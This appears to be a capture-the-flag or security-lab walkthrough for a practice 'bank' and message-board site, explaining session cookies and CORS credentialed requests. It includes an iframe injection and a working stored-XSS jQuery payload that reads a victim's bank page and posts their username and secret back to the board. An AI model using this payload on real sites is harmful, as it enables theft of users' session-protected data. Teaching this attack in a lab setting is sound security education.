First thing's first, login to bank.wcsc

Note that once logged in, the page will display your secret.

Then head over to board and spit the following into a comment:

<iframe src="http://bank.wcsc"></iframe>

Cool, we can see the bank. Oh crap but how!

Because we're embedding the bank page in our page. Check the network tab, see
the request. Look at the headers and see that it sends the PHPSESSID cookie.

The PHPSESSID cookie contains the unique ID of our PHP Session.

What's a PHP session? It's a way for PHP to keep track of values it has saved
for you on the server. It makes it an easy way for the server to remember you're
logged in. But if someone steals this cookie, then they have full control over you.

Any cookies set by a domain will be sent to the domain on all requests, whether
ajax or not.

Speaking of AJAX, how do we pull the page with Ajax? Well, you have to include
the withCredentials flag in order to make requests with cookies. This is part
of the browser's HTTP access control (CORS) system.

$.ajax("http://bank.wcsc", {
    type: "GET",
    success: (a) => console.log(a),
    xhrFields: {
        withCredentials: true
    },
    crossDomain: true
});

Bam, what did we get? the contents of the page. If you go to the network tab
and click the preview button you can get a render of the page returned.

What's in this page? Our secret!

So we just pulled our bank secret from a completely different domain without
the user even knowing!

Embed this script in the page through a comment, and when the robot
bot zooms through, you can steal their bank secret.

$.ajax("http://bank.wcsc", {
    type: "GET",
    xhrFields: {
        withCredentials: true
    },
    crossDomain: true,
    success: function(data){
        data = $(data);

        var user = data.find('#username').text().trim();
        var secret = data.find('#secret').text().trim();

        console.log('u: ',user, 's: ',secret);

        if(user !== 'robot'){
            return;
        }

        $.post(window.location.href, {
            username: 'We Found Data!',
            comment: 'User: ' + user + "\n\nSecret: " + secret
        });
    }
});
